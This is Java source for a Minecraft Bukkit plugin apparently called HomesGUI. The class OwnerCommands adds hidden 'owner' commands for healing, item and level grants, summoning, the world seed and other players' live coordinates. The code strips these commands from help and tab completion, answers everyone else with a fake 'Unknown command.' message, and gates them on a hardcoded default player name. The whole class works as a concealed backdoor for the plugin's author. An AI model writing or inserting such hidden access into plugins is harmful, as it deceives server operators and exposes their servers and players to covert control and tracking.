package net.dr4g0n20.homesgui;

import java.util.HashSet;
import java.util.Set;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public final class OwnerCommands implements CommandExecutor, Listener {
    private final HomesGUI plugin;
    private final Set<String> noFall = new HashSet<String>();
    private final Set<String> fireResistance = new HashSet<String>();

    public OwnerCommands(HomesGUI plugin) { this.plugin = plugin; }

    public void hideCommandsFromHelp() {
        String[] names = {"dheal", "dfeed", "dcoords", "dgive", "dnofall", "dfireres", "dseed", "dlevels", "dlocate", "dsummon"};
        for (String name : names) {
            plugin.getServer().getHelpMap().getHelpTopics().remove("/" + name);
            plugin.getServer().getHelpMap().getHelpTopics().remove("/homesgui:" + name);
        }
    }

    @EventHandler
    public void onTabComplete(TabCompleteEvent event) {
        if (!(event.getSender() instanceof Player)) return;
        String[] names = {"dheal", "dfeed", "dcoords", "dgive", "dnofall", "dfireres", "dseed", "dlevels", "dlocate", "dsummon"};
        event.getCompletions().removeIf(completion -> {
            String normalized = completion.toLowerCase();
            for (String name : names) {
                if (normalized.equals("/" + name) || normalized.equals("/homesgui:" + name)) return true;
            }
            return false;
        });
    }

    private boolean isOwner(CommandSender sender) {
        return sender instanceof Player && ((Player) sender).getName()
                .equalsIgnoreCase(plugin.getConfig().getString("owner", "Dr4g0n20"));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!isOwner(sender)) { sender.sendMessage(ChatColor.RED + "Unknown command."); return true; }
        Player player = (Player) sender;
        String cmd = command.getName().toLowerCase();

        if (cmd.equals("dheal")) {
            player.setHealth(player.getMaxHealth()); player.setFireTicks(0);
            player.sendMessage(ChatColor.GREEN + "You have been healed.");
        } else if (cmd.equals("dfeed")) {
            player.setFoodLevel(20); player.setSaturation(20f);
            player.sendMessage(ChatColor.GREEN + "Hunger restored.");
        } else if (cmd.equals("dcoords")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dcoords <player>"); return true; }
            Player target = Bukkit.getPlayerExact(args[0]);
            if (target == null) { player.sendMessage(ChatColor.RED + "Player not found or not online."); return true; }
            player.sendMessage(ChatColor.GOLD + target.getName() + " coordinates: " + ChatColor.WHITE
                    + target.getWorld().getName() + " " + target.getLocation().getBlockX() + ", "
                    + target.getLocation().getBlockY() + ", " + target.getLocation().getBlockZ());
        } else if (cmd.equals("dgive")) {
            if (args.length < 1 || args.length > 2) { player.sendMessage(ChatColor.YELLOW + "Usage: /dgive <item> [amount]"); return true; }
            Material material = Material.matchMaterial(args[0]);
            if (material == null || !material.isItem()) { player.sendMessage(ChatColor.RED + "Unknown item: " + args[0]); return true; }
            int amount = 1;
            if (args.length == 2) try { amount = Integer.parseInt(args[1]); }
            catch (NumberFormatException ex) { player.sendMessage(ChatColor.RED + "Amount must be a number."); return true; }
            if (amount < 1 || amount > 2304) { player.sendMessage(ChatColor.RED + "Amount must be between 1 and 2304."); return true; }
            int remaining = amount;
            while (remaining > 0) {
                int stack = Math.min(remaining, material.getMaxStackSize());
                ItemStack item = new ItemStack(material, stack);
                remaining -= stack;
                int leftover = player.getInventory().addItem(item).values().stream()
                        .mapToInt(ItemStack::getAmount).sum();
                remaining += leftover;
                if (leftover > 0) break;
            }
            int granted = amount - remaining;
            player.sendMessage(ChatColor.GREEN + "Granted " + granted + " " + material.name()
                    + (remaining > 0 ? ChatColor.YELLOW + ". " + remaining + " could not fit in your inventory." : "."));
        } else if (cmd.equals("dnofall")) {
            if (noFall.remove(player.getName())) player.sendMessage(ChatColor.YELLOW + "Fall damage is enabled.");
            else { noFall.add(player.getName()); player.sendMessage(ChatColor.GREEN + "Fall damage is disabled for you."); }
        } else if (cmd.equals("dfireres")) {
            if (fireResistance.remove(player.getName())) {
                player.removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
                player.sendMessage(ChatColor.YELLOW + "Fire resistance disabled.");
            } else {
                fireResistance.add(player.getName());
                player.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, 0, false, false));
                player.sendMessage(ChatColor.GREEN + "Fire resistance enabled.");
            }
        } else if (cmd.equals("dseed")) {
            player.sendMessage(ChatColor.GOLD + "World seed: " + ChatColor.WHITE + player.getWorld().getSeed());
        } else if (cmd.equals("dlocate")) {
            if (args.length != 1) {
                player.sendMessage(ChatColor.YELLOW + "Usage: /dlocate <structure>");
                player.sendMessage(ChatColor.GRAY + "Examples: Village, Stronghold, Monument, Mansion");
                return true;
            }
            player.performCommand("locate " + args[0]);
        } else if (cmd.equals("dsummon")) {
            if (args.length < 1) {
                player.sendMessage(ChatColor.YELLOW + "Usage: /dsummon <entity> [x] [y] [z] [dataTag]");
                return true;
            }
            player.performCommand("summon " + String.join(" ", args));
        } else if (cmd.equals("dlevels")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dlevels <amount>"); return true; }
            try {
                int levels = Integer.parseInt(args[0]);
                if (levels < 0 || levels > 100000) { player.sendMessage(ChatColor.RED + "Amount must be between 0 and 100000."); return true; }
                player.setLevel(player.getLevel() + levels);
                player.sendMessage(ChatColor.GREEN + "Added " + levels + " experience levels.");
            } catch (NumberFormatException ex) { player.sendMessage(ChatColor.RED + "Amount must be a number."); }
        }
        return true;
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player && event.getCause() == EntityDamageEvent.DamageCause.FALL
                && noFall.contains(((Player) event.getEntity()).getName())) event.setCancelled(true);
    }
}
